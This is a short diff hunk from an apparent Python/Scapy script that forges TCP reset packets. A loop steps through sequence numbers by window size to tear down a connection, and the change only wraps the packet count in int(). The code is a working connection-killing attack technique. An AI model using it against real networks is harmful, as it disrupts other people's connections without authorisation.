@@ -18,7 +18,7 @@ def pkt_callback(packet):
             window = resetPkt[TCP].window
             num_packs = (2**32)/window
             #now enumerate through possible sequence numbers to try and kill the connection
-            for i in range(num_packs):
+            for i in range(int(num_packs)):
                 seq = i*window
                 resetPkt[TCP].seq = seq
                 sendp(resetPkt)
